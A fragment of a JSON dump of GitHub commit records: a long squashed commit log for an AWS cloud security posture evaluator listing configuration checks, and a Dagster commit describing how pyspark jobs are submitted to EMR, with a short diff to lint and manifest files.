test\r\n\r\n* Add icmpv6 in icmp access test\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Add cloudwatch tester (#70)\r\n\r\n* Add cloudwatch tester\r\n\r\n* Add multiple check for alarms present in cloudwatch\r\n\r\n* Add more cloudwatch checks and one cloudformation check for stack notifications\r\n\r\n* Add small fix\r\n\r\n* Add item to results\r\n\r\n* removed unnecessary line\r\n\r\n* Add result object helper method\r\n\r\n* item name changed to cloudformation_stack name in unauthorized api calls not monitored\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* fix protodep.toml typo (#105)\r\n\r\n* Use or for bucket not configured with block public access test\r\n\r\n* Add global delete permissions enabled\r\n\r\n* Remove debug lines\r\n\r\n* Fix global put permission enabled test\r\n\r\n* Add linter to clean the tester\r\n\r\nCo-authored-by: harikarthickm <76831661+harikarthickm@users.noreply.github.com>\r\nCo-authored-by: Vaibhav <49142340+vaibhavgope@users.noreply.github.com>\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\nCo-authored-by: zina <36052945+zina-mev@users.noreply.github.com>\r\nCo-authored-by: Bhuvanesh-J <87064334+Bhuvanesh-J@users.noreply.github.com>\r\nCo-authored-by: Eldar Aliiev <bc.zim.green@gmail.com>\r\nCo-authored-by: Barnab\u00e1s Ol\u00e1h <7964844+stsatlantis@users.noreply.github.com>\r\n\r\n* Elastic Search Tester Tasks Added. (#114)\r\n\r\n* Add redshift cluster not encrypted with kms keys test (#80)\r\n\r\n* Add redshift cluster not encrypted with kms keys test\r\n\r\n* Add pagination to get all redshift clusters\r\n\r\n* VPC Tester Tasks Added. (#115)\r\n\r\n* Auto posture evaluator\/iam antstack (#109)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add server certificate expire in 30 days\r\n\r\n* Add expired server certificates removed\r\n\r\n* Add passwords expire in 90 days test\r\n\r\n* Add condition checks for password policy\r\n\r\n* small fix\r\n\r\n* Add check for AWS support role exists\r\n\r\n* Add check for user with admin access\r\n\r\n* Add password policy reuse test\r\n\r\n* Add check for root account's access key\r\n\r\n* Add mfa enabled for all IAM users test\r\n\r\n* Add role uses trusted principals test\r\n\r\n* Fix h\/w MFA enabled for root account\r\n\r\n* Add access keys are not created for IAM user\r\n\r\n* Add check for policy with admin privileges\r\n\r\n* Add NoSuchEntityException in password has 14 or more char check\r\n\r\n* Add NoSuchEntiry exception in password expires in 90 days test\r\n\r\n* Add NoSuchEntity exception in password requires lowercase test\r\n\r\n* Add NoSuchEntity exception for password requires uppercase test\r\n\r\n* Add NoSuchEntity exception in password requires symbols test\r\n\r\n* Add NoSuchEntity exception in password policy requires numbers test\r\n\r\n* Add NoSuchEntity exception in password reuse test\r\n\r\n* Add small fixes\r\n\r\n* Add iam user credentials unused for 45 days test\r\n\r\n* Use constant for password max age 90 days test\r\n\r\n* Use constant in password maximum length test\r\n\r\n* Use constant in access keys rotated every 90 days test\r\n\r\n* Fix server certificate issue\r\n\r\n* Add IAM user has more than one active access key test\r\n\r\n* Add IAM access analyzer disabled test\r\n\r\n* Remove item from result when there isn't any resource\r\n\r\n* Add pre heartbleed bug server certificates check\r\n\r\n* Bug fix\r\n\r\n* Add there is atleast one IAM user with access keys test\r\n\r\n* Add detect IAM users present test\r\n\r\n* Add helper method to get all the IAM users\r\n\r\n* Add helper method to get response structure\r\n\r\n* Add explicit checks for programmatic users and never logged in user\r\n\r\n* Lambda extension architecture optionality added (#59)\r\n\r\n* Europe2 endpoint added (#60)\r\n\r\n* CloudWatch Fix\r\n\r\n* Restriction check for topic,subscription and encryption functions are done (#63)\r\n\r\nElastic Search Tester cases - Latest Engine Version,Using VPC,Encryption enabled,KMS CMK - Done\r\n\r\n* Elastic Search Tester cases - Latest Engine Version,Using VPC,Encryption enabled,KMS CMK - Done (#58)\r\n\r\nElastic Search -  Not publicly accessible\r\n\r\n* SQS - Tester file added (#65)\r\n\r\n* SQS - Tester file added\r\n\r\n* Fixes in the Sqs testers\r\n\r\n* Auto posture evaluator\/elb antstack (#66)\r\n\r\n* Add elbv2 has deletion protection enabled test\r\n\r\n* Add elbv2 allows https traffic only\r\n\r\n* Add ALB using TLSv1.2 or higher test\r\n\r\n* Add NLB using TLSv1.2 or higher\r\n\r\n* Fix run_tests method\r\n\r\n* Fix elbv2 allows HTTPS traffic\r\n\r\n* Fix ALB using TLSv1.2 or higher\r\n\r\n* Fix NLB using TLSv1.2 or higher\r\n\r\n* Add ELB is internet facing\r\n\r\n* Fix ELBv2 internet facing test\r\n\r\n* Add NLB shouldn't allow insecure negotiation policy test\r\n\r\n* Fix NLB using TLSv1.2 or higher issue\r\n\r\n* Fix ALB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB support insecure negotiation policy test\r\n\r\n* Add ALB should be renewed in 30 days in advance\r\n\r\n* add grpc endpoint (#71)\r\n\r\n* add grpc endpoint\r\n\r\n* change execution_id\r\n\r\n* add model folder to the package_generator.sh\r\n\r\n* change the return value of logger method and chnge the README file\r\n\r\n* remove await\r\n\r\n* remove readme\r\n\r\n* Removing the coralogix (old) endpoint\r\n\r\n* Change raise exception to print an continue\r\n\r\n* delete package folder in the beginning\r\n\r\n* Remove exception in case the Result list is empty (#86)\r\n\r\n* Add neptune cluster tests (#82)\r\n\r\n* Add neptune cluster tests\r\n\r\n* Fix neptune cluster audit log issue\r\n\r\n* fix uuid - to generate uuid4() (#87)\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc (#90)\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc\r\n\r\n* add try block\r\n\r\n* remove try (#91)\r\n\r\n* remove event loop.close() (#92)\r\n\r\n* Auto posture evaluator\/kms antstack (#62)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add key rotation status validation\r\n\r\n* Add kms cmk pending deletion check\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Auto posture evaluator\/ebs antstack (#64)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Added ebs tests\r\n\r\n* Add checks for snapshot and kms key encryption\r\n\r\n* Remove print statement and change recent snapshot duration from 14 to 7 days\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Delete iam_tester.py\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Sqs-Tester Tasks added (#93)\r\n\r\n* Feature\/update modle (#96)\r\n\r\n* Update the model (__init__py) and the auto_posture_evaluator- execution_id, provider and service was moved to the context and the private_key was removed from the context.\r\n\r\n* remove tmp folder\r\n\r\n* Add protodep.toml file and remove unnecessary code\r\n\r\n* SES Tester empty object condition check added. (#98)\r\n\r\n* Auto posture evaluator\/s3 antstack (#67)\r\n\r\n* Add check for bucket logging\r\n\r\n* Add check for bucket encryption with cmk\r\n\r\n* Add check for block public access setting\r\n\r\n* Add check for bucket public access configuration\r\n\r\n* Add checks for ACL permissions and small fixes\r\n\r\n* Add account id as item in return statement for a function\r\n\r\n* Add checks for bucket had global list, put or get permissions through bucket policy\r\n\r\n* Add start and end time for each tester (#100)\r\n\r\n* DMS Tester Tasks added. (#97)\r\n\r\n* Auto posture evaluator\/ec2 modified antstack (#69)\r\n\r\n* Initial commit\r\n\r\n* Fix HTTP, HTTPS, MongoDb, MySql, MSSql, SSH, RDP, PostgreSql inbound access response\r\n\r\n* Fix DNS, RPC, Telnet inbound access response\r\n\r\n* Fix inbound ICMP access response\r\n\r\n* Fix inbound ICMP access check\r\n\r\n* Fix ingress access to remote administration port anywhere test response\r\n\r\n* Fix VPC default security group restric all traffic\r\n\r\n* Fix outbound access to all port response\r\n\r\n* Fix inbound Oracle access response\r\n\r\n* Fix FTP inbound access test response\r\n\r\n* Fix inbound SMTP access response\r\n\r\n* Fix inbound elastic search access response\r\n\r\n* Fix inbound TCP and UDP netBios check\r\n\r\n* Fix inbound CIFS access\r\n\r\n* Add instance uses metadata service version 2 test\r\n\r\n* Add security group allows https access test\r\n\r\n* Add SG allows ingress traffic from ports higher than 1024\r\n\r\n* Add unrestricted admin port access in network ACL test\r\n\r\n* Add internet gateway resence detected test\r\n\r\n* Add sensitive instance tanancy not dedicated test\r\n\r\n* Add tests for aws config not enabled for region, regonal limit for EIP addresses, IAM role not enabled\r\n\r\n* Add paginated method to get all VPCs\r\n\r\n* Add default security group allow inbound traffic test\r\n\r\n* Add instances with upcoming system maintenance schedule event test\r\n\r\n* Add instance with upcoming stop schedule event test\r\n\r\n* Add instances with system reboot schedule event test\r\n\r\n* Add region nearing limit of ec2 instances test\r\n\r\n* Add elastic IP addresses in use test\r\n\r\n* Add unrestricted MySql from anywhere test\r\n\r\n* Add instances with upcoming instance reboot schedule event test\r\n\r\n* Add detect classic EC2 instance test\r\n\r\n* Add SG should allow access to specific private network test\r\n\r\n* Add network firewall used test\r\n\r\n* Fix SG allows ingress to remote admin ports from anywhere test\r\n\r\n* Add small fix\r\n\r\n* Add return object helper method\r\n\r\n* Add configurable ec2 sensitive tag\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Move the test list to env (#102)\r\n\r\n* Move the test list to env\r\n\r\n* Check tester real path. test all tester when no env\r\n\r\n* Change the exeption message\r\n\r\n* return statement added for a function (#103)\r\n\r\n* Auto posture evaluator\/elb antstack (#76)\r\n\r\n* Add elbv2 has deletion protection enabled test\r\n\r\n* Add elbv2 allows https traffic only\r\n\r\n* Add ALB using TLSv1.2 or higher test\r\n\r\n* Add NLB using TLSv1.2 or higher\r\n\r\n* Fix run_tests method\r\n\r\n* Fix elbv2 allows HTTPS traffic\r\n\r\n* Fix ALB using TLSv1.2 or higher\r\n\r\n* Fix NLB using TLSv1.2 or higher\r\n\r\n* Add ELB is internet facing\r\n\r\n* Fix ELBv2 internet facing test\r\n\r\n* Add NLB shouldn't allow insecure negotiation policy test\r\n\r\n* Fix NLB using TLSv1.2 or higher issue\r\n\r\n* Fix ALB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB support insecure negotiation policy test\r\n\r\n* Add ALB should be renewed in 30 days in advance\r\n\r\n* Add ELBv1 cross zone load balancing enabled test\r\n\r\n* Add ELBv1 connection draining enabled test\r\n\r\n* Add no registered instances in an ELBv1 test\r\n\r\n* Add ELBv1 should allow TLSv1.2 higher test\r\n\r\n* Fix typo\r\n\r\n* Add check for IAM certificate for ALB certificate should be renewed in 30 days\r\n\r\n* Remove response item in result when there isn't any ELB\r\n\r\n* Add pagination in describe LB to get all LBs\r\n\r\n* Add ELBv1 SSL certificate expires in 90 days test\r\n\r\n* Add env variable for SSL certificate expiry test\r\n\r\n* Add small fix\r\n\r\n* Add ELB SSL certificate should be renewed 5 days in advance test\r\n\r\n* Add ELB supports vulnerable negotiation policy test\r\n\r\n* first commit (#104)\r\n\r\n* Auto posture evaluator\/ec2 modified antstack (#107)\r\n\r\n* Initial commit\r\n\r\n* Fix HTTP, HTTPS, MongoDb, MySql, MSSql, SSH, RDP, PostgreSql inbound access response\r\n\r\n* Fix DNS, RPC, Telnet inbound access response\r\n\r\n* Fix inbound ICMP access response\r\n\r\n* Fix inbound ICMP access check\r\n\r\n* Fix ingress access to remote administration port anywhere test response\r\n\r\n* Fix VPC default security group restric all traffic\r\n\r\n* Fix outbound access to all port response\r\n\r\n* Fix inbound Oracle access response\r\n\r\n* Fix FTP inbound access test response\r\n\r\n* Fix inbound SMTP access response\r\n\r\n* Fix inbound elastic search access response\r\n\r\n* Fix inbound TCP and UDP netBios check\r\n\r\n* Fix inbound CIFS access\r\n\r\n* Add instance uses metadata service version 2 test\r\n\r\n* Add security group allows https access test\r\n\r\n* Add SG allows ingress traffic from ports higher than 1024\r\n\r\n* Add unrestricted admin port access in network ACL test\r\n\r\n* Add internet gateway resence detected test\r\n\r\n* Add sensitive instance tanancy not dedicated test\r\n\r\n* Add tests for aws config not enabled for region, regonal limit for EIP addresses, IAM role not enabled\r\n\r\n* Add paginated method to get all VPCs\r\n\r\n* Add default security group allow inbound traffic test\r\n\r\n* Add instances with upcoming system maintenance schedule event test\r\n\r\n* Add instance with upcoming stop schedule event test\r\n\r\n* Add instances with system reboot schedule event test\r\n\r\n* Add region nearing limit of ec2 instances test\r\n\r\n* Add elastic IP addresses in use test\r\n\r\n* Add unrestricted MySql from anywhere test\r\n\r\n* Add instances with upcoming instance reboot schedule event test\r\n\r\n* Add detect classic EC2 instance test\r\n\r\n* Add SG should allow access to specific private network test\r\n\r\n* Add network firewall used test\r\n\r\n* Fix SG allows ingress to remote admin ports from anywhere test\r\n\r\n* Add small fix\r\n\r\n* Add return object helper method\r\n\r\n* Add configurable ec2 sensitive tag\r\n\r\n* Fix sensitive instances tags not present issue\r\n\r\n* Add env variable for per region max cpu count limit\r\n\r\n* Add empty response check in nearing regional limit for e-IP test\r\n\r\n* Add is exists check i aws config not enabled for all region test\r\n\r\n* Check ::\/0 in IP range\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Blocking pattern parameter added (#106)\r\n\r\n* Auto posture evaluator\/ec2 modified antstack (#108)\r\n\r\n* Initial commit\r\n\r\n* Fix HTTP, HTTPS, MongoDb, MySql, MSSql, SSH, RDP, PostgreSql inbound access response\r\n\r\n* Fix DNS, RPC, Telnet inbound access response\r\n\r\n* Fix inbound ICMP access response\r\n\r\n* Fix inbound ICMP access check\r\n\r\n* Fix ingress access to remote administration port anywhere test response\r\n\r\n* Fix VPC default security group restric all traffic\r\n\r\n* Fix outbound access to all port response\r\n\r\n* Fix inbound Oracle access response\r\n\r\n* Fix FTP inbound access test response\r\n\r\n* Fix inbound SMTP access response\r\n\r\n* Fix inbound elastic search access response\r\n\r\n* Fix inbound TCP and UDP netBios check\r\n\r\n* Fix inbound CIFS access\r\n\r\n* Add instance uses metadata service version 2 test\r\n\r\n* Add security group allows https access test\r\n\r\n* Add SG allows ingress traffic from ports higher than 1024\r\n\r\n* Add unrestricted admin port access in network ACL test\r\n\r\n* Add internet gateway resence detected test\r\n\r\n* Add sensitive instance tanancy not dedicated test\r\n\r\n* Add tests for aws config not enabled for region, regonal limit for EIP addresses, IAM role not enabled\r\n\r\n* Add paginated method to get all VPCs\r\n\r\n* Add default security group allow inbound traffic test\r\n\r\n* Add instances with upcoming system maintenance schedule event test\r\n\r\n* Add instance with upcoming stop schedule event test\r\n\r\n* Add instances with system reboot schedule event test\r\n\r\n* Add region nearing limit of ec2 instances test\r\n\r\n* Add elastic IP addresses in use test\r\n\r\n* Add unrestricted MySql from anywhere test\r\n\r\n* Add instances with upcoming instance reboot schedule event test\r\n\r\n* Add detect classic EC2 instance test\r\n\r\n* Add SG should allow access to specific private network test\r\n\r\n* Add network firewall used test\r\n\r\n* Fix SG allows ingress to remote admin ports from anywhere test\r\n\r\n* Add small fix\r\n\r\n* Add return object helper method\r\n\r\n* Add configurable ec2 sensitive tag\r\n\r\n* Fix sensitive instances tags not present issue\r\n\r\n* Add env variable for per region max cpu count limit\r\n\r\n* Add empty response check in nearing regional limit for e-IP test\r\n\r\n* Add is exists check i aws config not enabled for all region test\r\n\r\n* Check ::\/0 in IP range\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc (#90)\r\n\r\n* Remove api key and if the result is empty do not sent to the grpc\r\n\r\n* add try block\r\n\r\n* remove try (#91)\r\n\r\n* remove event loop.close() (#92)\r\n\r\n* Auto posture evaluator\/kms antstack (#62)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add key rotation status validation\r\n\r\n* Add kms cmk pending deletion check\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Auto posture evaluator\/ebs antstack (#64)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Added ebs tests\r\n\r\n* Add checks for snapshot and kms key encryption\r\n\r\n* Remove print statement and change recent snapshot duration from 14 to 7 days\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Updated threshold time period to get value from env\r\n\r\n* Delete iam_tester.py\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\n* Add volume snapshots are public test and refactor code\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Sqs-Tester Tasks added (#93)\r\n\r\n* Feature\/update modle (#96)\r\n\r\n* Update the model (__init__py) and the auto_posture_evaluator- execution_id, provider and service was moved to the context and the private_key was removed from the context.\r\n\r\n* remove tmp folder\r\n\r\n* Add protodep.toml file and remove unnecessary code\r\n\r\n* SES Tester empty object condition check added. (#98)\r\n\r\n* Auto posture evaluator\/s3 antstack (#67)\r\n\r\n* Add check for bucket logging\r\n\r\n* Add check for bucket encryption with cmk\r\n\r\n* Add check for block public access setting\r\n\r\n* Add check for bucket public access configuration\r\n\r\n* Add checks for ACL permissions and small fixes\r\n\r\n* Add account id as item in return statement for a function\r\n\r\n* Add checks for bucket had global list, put or get permissions through bucket policy\r\n\r\n* Add start and end time for each tester (#100)\r\n\r\n* DMS Tester Tasks added. (#97)\r\n\r\n* Auto posture evaluator\/iam antstack (#61)\r\n\r\n* Add password length check\r\n\r\n* Add hardware mfa enabled check for root\r\n\r\n* Add MFA enabled for root account test\r\n\r\n* Add check for policy doesn't have user attached\r\n\r\n* Add access key rotated every 90 days check\r\n\r\n* Add server certificate expire in 30 days\r\n\r\n* Add expired server certificates removed\r\n\r\n* Add passwords expire in 90 days test\r\n\r\n* Add condition checks for password policy\r\n\r\n* small fix\r\n\r\n* Add check for AWS support role exists\r\n\r\n* Add check for user with admin access\r\n\r\n* Add password policy reuse test\r\n\r\n* Add check for root account's access key\r\n\r\n* Add mfa enabled for all IAM users test\r\n\r\n* Add role uses trusted principals test\r\n\r\n* Fix h\/w MFA enabled for root account\r\n\r\n* Add access keys are not created for IAM user\r\n\r\n* Add check for policy with admin privileges\r\n\r\n* Add NoSuchEntityException in password has 14 or more char check\r\n\r\n* Add NoSuchEntiry exception in password expires in 90 days test\r\n\r\n* Add NoSuchEntity exception in password requires lowercase test\r\n\r\n* Add NoSuchEntity exception for password requires uppercase test\r\n\r\n* Add NoSuchEntity exception in password requires symbols test\r\n\r\n* Add NoSuchEntity exception in password policy requires numbers test\r\n\r\n* Add NoSuchEntity exception in password reuse test\r\n\r\n* Add small fixes\r\n\r\n* Add iam user credentials unused for 45 days test\r\n\r\n* Use constant for password max age 90 days test\r\n\r\n* Use constant in password maximum length test\r\n\r\n* Use constant in access keys rotated every 90 days test\r\n\r\n* Fix server certificate issue\r\n\r\n* Add IAM user has more than one active access key test\r\n\r\n* Add IAM access analyzer disabled test\r\n\r\n* Remove item from result when there isn't any resource\r\n\r\n* Add pre heartbleed bug server certificates check\r\n\r\n* Bug fix\r\n\r\n* Add there is atleast one IAM user with access keys test\r\n\r\n* Add detect IAM users present test\r\n\r\n* Add helper method to get all the IAM users\r\n\r\n* Add helper method to get response structure\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Move the test list to env (#102)\r\n\r\n* Move the test list to env\r\n\r\n* Check tester real path. test all tester when no env\r\n\r\n* Change the exeption message\r\n\r\n* return statement added for a function (#103)\r\n\r\n* Auto posture evaluator\/elb antstack (#76)\r\n\r\n* Add elbv2 has deletion protection enabled test\r\n\r\n* Add elbv2 allows https traffic only\r\n\r\n* Add ALB using TLSv1.2 or higher test\r\n\r\n* Add NLB using TLSv1.2 or higher\r\n\r\n* Fix run_tests method\r\n\r\n* Fix elbv2 allows HTTPS traffic\r\n\r\n* Fix ALB using TLSv1.2 or higher\r\n\r\n* Fix NLB using TLSv1.2 or higher\r\n\r\n* Add ELB is internet facing\r\n\r\n* Fix ELBv2 internet facing test\r\n\r\n* Add NLB shouldn't allow insecure negotiation policy test\r\n\r\n* Fix NLB using TLSv1.2 or higher issue\r\n\r\n* Fix ALB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB should allow TLSv1.2 or higher test\r\n\r\n* Fix NLB support insecure negotiation policy test\r\n\r\n* Add ALB should be renewed in 30 days in advance\r\n\r\n* Add ELBv1 cross zone load balancing enabled test\r\n\r\n* Add ELBv1 connection draining enabled test\r\n\r\n* Add no registered instances in an ELBv1 test\r\n\r\n* Add ELBv1 should allow TLSv1.2 higher test\r\n\r\n* Fix typo\r\n\r\n* Add check for IAM certificate for ALB certificate should be renewed in 30 days\r\n\r\n* Remove response item in result when there isn't any ELB\r\n\r\n* Add pagination in describe LB to get all LBs\r\n\r\n* Add ELBv1 SSL certificate expires in 90 days test\r\n\r\n* Add env variable for SSL certificate expiry test\r\n\r\n* Add small fix\r\n\r\n* Add ELB SSL certificate should be renewed 5 days in advance test\r\n\r\n* Add ELB supports vulnerable negotiation policy test\r\n\r\n* first commit (#104)\r\n\r\n* Blocking pattern parameter added (#106)\r\n\r\n* Add tcp port 138 for netbios test\r\n\r\n* Add udp port 139 for netbios test\r\n\r\n* Add icmpv6 in icmp access test\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Add cloudwatch tester (#70)\r\n\r\n* Add cloudwatch tester\r\n\r\n* Add multiple check for alarms present in cloudwatch\r\n\r\n* Add more cloudwatch checks and one cloudformation check for stack notifications\r\n\r\n* Add small fix\r\n\r\n* Add item to results\r\n\r\n* removed unnecessary line\r\n\r\n* Add result object helper method\r\n\r\n* item name changed to cloudformation_stack name in unauthorized api calls not monitored\r\n\r\nCo-authored-by: sleepy0owl <souravcristiano502@gmail.com>\r\n\r\n* Remove unused import\r\n\r\n* Use list attached user policies method for priviledged user has admin permission test\r\n\r\n* Add flake8 for linting\r\n\r\n* Fix current date issue\r\n\r\n* Remove debug lines\r\n\r\n* Fix IAM roles using trusted principals test\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\n\r\n* Auto posture evaluator\/emr antstack (#94)\r\n\r\n* Add EMR cluster should have security configuration test\r\n\r\n* Add EMR cluster should  use kerberos authentication test\r\n\r\n* Add EMR in transit and at rest encryption enabled test\r\n\r\n* small fix\r\n\r\n* Add cluster should use kms for s3 sse test\r\n\r\n* Add cluster should have local disk encryption with cmk test\r\n\r\n* Fix in key check\r\n\r\n* Add EMR clusters should upload logs to S3 test\r\n\r\n* Add emr cluster should have local disk encryption test\r\n\r\n* Add EMR cluster should have encryption at transit enabled test\r\n\r\n* Add emr cluster should use cse kms test\r\n\r\n* Add helper method to get return obejct\r\n\r\n* Add emr cluster encryption is enabled test\r\n\r\n* Fix security configuration issue in emr should use kms for sse test\r\n\r\n* Fix emr cluster should use kms for cse\r\n\r\n* Fix security configuration issue in emr cluster should be encrypted test\r\n\r\n* Fix security config issue in emr cluster in transit encryption enabled test\r\n\r\n* Fix security config in emr cluster at rest local disk config test\r\n\r\n* Fix security config issue in disk encryption test\r\n\r\n* Added WAF Tester Tasks. (#118)\r\n\r\n* Auto posture evaluator\/dms antstack 2 (#131)\r\n\r\n* Add replication instances have auto minor version upgrade test\r\n\r\n* Add multi az is enabled test\r\n\r\n* Fix dms response\r\n\r\n* Add methods to runtests method\r\n\r\n* Prefix 'aws' added for new Redshift Tester function. (#132)\r\n\r\n* EKS Tester tasks are added. (#119)\r\n\r\nCo-authored-by: Vaibhav Gope <vaibhav.gope@antstack.io>\r\nCo-authored-by: harikarthickm <76831661+harikarthickm@users.noreply.github.com>\r\nCo-authored-by: Vaibhav <49142340+vaibhavgope@users.noreply.github.com>\r\nCo-authored-by: zina <36052945+zina-mev@users.noreply.github.com>\r\nCo-authored-by: Bhuvanesh-J <87064334+Bhuvanesh-J@users.noreply.github.com>\r\nCo-authored-by: Eldar Aliiev <bc.zim.green@gmail.com>\r\nCo-authored-by: Barnab\u00e1s Ol\u00e1h <7964844+stsatlantis@users.noreply.github.com>"}},"https:\/\/github.com\/dagster-io\/dagster":{"1e02665ca7b2d58f178a499e0ab7b8056a4bab52":{"url":"https:\/\/api.github.com\/repos\/dagster-io\/dagster\/commits\/1e02665ca7b2d58f178a499e0ab7b8056a4bab52","html_url":"https:\/\/github.com\/dagster-io\/dagster\/commit\/1e02665ca7b2d58f178a499e0ab7b8056a4bab52","message":"pyspark on EMR\n\nSummary:\n**Summary**\nPutting this up for discussion.\n\nThis is a (rough) cut at the thing @sashank, @max and I were discussing on Friday, where we use a decorator to express that a pyspark solid's compute function should behave differently when shipping compute to a remote EMR cluster.\n\n**Context**\nEMR must run pyspark workloads with `yarn` specified as the master URI. To run this way, Spark must have access to a local Hadoop\/Spark\/YARN install on the machine running `spark-submit` or calling `SparkSession.builder.getOrCreate()`, and this local installation must be properly configured with `core-site.xml`, etc. along with all other Hadoop XML files that define the DNS names and hosts in the YARN cluster.\n\nThis is easy when invoking a job directly on the EMR master (already configured), or through the EMR `boto3` APIs, but not something you can set up locally (very difficult to get everything configured correctly, and fragile).\n\nBecause of this, there isn't a way to tell EMR to \"run just this one solid\"\u2014EMR expects us to invoke `spark-submit <options> foo.py` either in a shell command on the master or via the EMR APIs, and it expects `foo.py` to be a self-contained pyspark application.\n\nGiven this, there is no obvious way to have pyspark solids structured like we've done historically, because the locally-constructed `SparkSession` won't be capable of interacting with a remote EMR cluster.\n\n**Options**\n\nWe have a few options that I can think of so far:\n\n1. Open all requisite ports between local machine and EMR cluster for Spark\/YARN\/Hadoop to communicate. This is wildly insecure (YARN has no security, anyone can then submit work to the YARN cluster)  so not a real option. This also would require all of the local Spark\/YARN\/Hadoop installation and XML configs, which is a huge burden to get configured right\u2014imagine how you'd have to reconfigure everything for every cluster you talk to in the ephemeral case.\n2. Maintain SSH tunnels between the local host running dagster and EMR cluster. This is very fragile, as the job will immediately be killed if your networking changes, and annoying to maintain healthy SSH tunnels (I've been down this route, it's a pain). Moreover, it would require configuring the local installations as in (1).\n3. Give up on the tight dagster <> pyspark integration, and just have separate orchestration and compute\u2014this is the norm today in Airflow, where you'd have a Pyspark operator that `subprocess.Popens` a `spark-submit my-pyspark-code.py`, and `my-pyspark-code.py` is a Python file that lives separately from the orchestration Python. EMR APIs effectively work the same, see an example here https:\/\/stackoverflow.com\/a\/37117296\/11295366.\n4. Structure Pyspark solids so that they execute differently on different Spark targets. Locally, we can just assume we can grab a `SparkSession` and go; for submitting the work to EMR, we should wrap execution of the solid into a separate Python file and submit ourselves as a workload to the EMR APIs. EMR expects (1) a main Python file, and (2) a zip archive of associated Python code you'd like to distribute to the Spark workers in the cluster. The EMR APIs will then effectively shell out to `spark-submit` locally on the EMR master, where the Spark installation is configured, such that instantiating a `SparkSession` will work fine.\n\n**Notes**\nThis diff implements a version of (4) above; tracking follow-up issues:\n\n~~1. The overriding of compute behavior based on where we're executing feels janky, and it feels like there's a weird mix of mode\/resource\/compute override going on here.~~\n~~2. The zip archive bundling seems prone to issues\/fragile; I'm building a zip of the Python code I find in the current directory and shipping it to S3; I worry that the `from ... import ...` to gain access to the invoking pipeline will be easy to get wrong.~~ -> will eventually support making this pluggable\n3. There's no guarantee we're going to be able to communicate back to the invoking Dagster instance on the host that kicked off the EMR job, rehydrate resources properly, or generally play nice with the rest of Dagster at all. Ideally we should probably assume we can't, and just use the EMR APIs in the invoking Dagster parent process to read back any metadata from the task execution via the EMR APIs.\n~~4. This bundles setting up the environment and execution into one step, which should be broken apart.~~\n~~5. Need to catch mode mismatches per Alex's comment~~ -> no longer an issue given the switch to resource-based implementation\n\nTest Plan: manual\n\nReviewers: alangenfeld, max, schrockn\n\nReviewed By: schrockn\n\nSubscribers: schrockn, themissinghlink, alangenfeld, max, sashank\n\nDifferential Revision: https:\/\/dagster.phacility.com\/D1349","sha":"1e02665ca7b2d58f178a499e0ab7b8056a4bab52","keyword":"remote code execution insecure","diff":"diff --git a\/.pylintrc b\/.pylintrc\nindex 5fb38167cdb..b82f31e2ccd 100644\n--- a\/.pylintrc\n+++ b\/.pylintrc\n@@ -20,7 +20,7 @@ disable=C,R,duplicate-code,W0511,W1201,W1202,no-init\n # See: https:\/\/github.com\/getsentry\/responses\/issues\/74\n [TYPECHECK]\n ignored-classes=responses\n-signature-mutators=solid,composite_solid,lambda_solid\n+signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid\n \n [MASTER]\n ignore=snapshots\n\\ No newline at end of file\ndiff --git a\/python_modules\/libraries\/dagster-aws\/MANIFEST.in b\/python_modules\/libraries\/dagster-aws\/MANIFEST.in\nindex d03147cbed9..9f8b39bc6d4 100644\n--- a\/python_modules\/libraries\/dagster-aws\/MANIFEST.in\n+++ b\/python_modules\/libraries\/dagster-aws\/MANIFEST.in\n@@ -1,3 +1,5 @@\n recursive-include dagster_aws *.sh\n recursive-include dagster_aws *.yaml\n+recursive-include dagster_aws *.txt\n+recursive-include dagster_aws *.template\n 